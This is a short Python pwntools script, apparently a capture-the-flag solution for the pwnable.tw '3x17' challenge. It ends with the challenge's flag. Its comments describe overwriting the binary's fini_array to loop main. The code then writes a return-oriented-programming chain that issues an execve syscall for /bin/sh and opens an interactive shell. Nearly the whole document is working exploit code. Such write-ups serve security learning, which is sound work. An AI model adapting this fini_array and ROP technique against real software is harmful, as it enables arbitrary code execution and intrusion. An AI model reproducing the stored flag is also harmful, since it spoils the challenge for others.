from pwn import *

r = process("./3x17")
#r = remote("chall.pwnable.tw","10105")
## exit call sequence : 0x402960(__libc_csu_fini) -> 0x401580(check_free.isra) -> 0x401b00(_do_global_dtors_aux) -> fini  -> 0x417e00
## __libc_csu_fini will call function store in fini_array, that is 0x401580 & 0x401b00
## so we can write fini_array to main and __libc_csu_fini to loop the main.
## And then we can ROP

def rewrite(addr,val):
    r.sendafter("addr:",str(addr).encode()) 
    r.sendafter("data:",val)


libc_csu_fini = 0x402960
fini_array= 0x4b40f0
main = 0x401B6D

### gadget 
pop_rdi = 0x401696
pop_rdx = 0x446e35
pop_rsi = 0x406c30
pop_rax = 0x41e4af
syscall = 0x4022b4
bin_sh = fini_array + 0x70
leave_ret = 0x401c4b
ret = 0x401016
input()
rewrite(fini_array,p64(libc_csu_fini)+p64(main))
rewrite(fini_array+0x18,p64(pop_rax) + p64(59) + p64(pop_rdi))
rewrite(fini_array+0x30,p64(bin_sh) + p64(pop_rdx) + p64(0))
rewrite(fini_array+0x48 , p64(pop_rsi) + p64(0) + p64(syscall))
rewrite(bin_sh,b'/bin/sh\0')
rewrite(fini_array,p64(leave_ret) + p64(pop_rax))

r.interactive()

#FLAG{Its_just_a_b4by_c4ll_0riented_Pr0gramm1ng_in_3xit}